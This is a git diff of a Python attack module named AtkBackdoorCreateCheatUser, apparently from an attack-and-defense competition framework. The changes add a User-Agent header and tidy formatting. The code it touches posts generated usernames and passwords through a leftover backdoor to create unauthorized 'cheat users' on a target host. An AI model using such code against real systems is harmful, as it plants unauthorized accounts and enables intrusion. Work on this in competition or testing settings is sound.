@@ -8,13 +8,12 @@ import hashlib
 import random
 from os import urandom
 
-
 class AtkBackdoorCreateCheatUser(object):
-    def __init__(self, utility, host="127.0.0.1", port="80", debug=False):
+    def __init__(self, utility, host="127.0.0.1", port="80" ,debug=False):
         self.utility = utility
-        self.utility.target = host
         self.host = host
         self.port = port
+        self.ua = utility.ua
         self.debug = debug
         self.description = "The module can be create cheat users if a backdoor is not delete yet."
         self.target = host + ":" + port
@@ -51,8 +50,8 @@ class AtkBackdoorCreateCheatUser(object):
                 set_nickname = random.choice(namelist) + "_" + nickname_token
                 injectuserid.append(set_nickname)
                 
-                json_data = { "user_name": set_id, "password": set_password, "nick_name": set_nickname}      
-                headers = { "Content-Type": "application/json" }
+                json_data = { "user_name": set_id, "password": set_password, "nick_name": set_nickname}
+                headers = { "Content-Type": "application/json", "User-Agent": self.ua }
                 response1 = session.post(target_url, data=json.dumps(json_data), headers=headers, proxies=proxies, timeout=timeoutvalue)
 
             self.logger("Attack complete", "+")
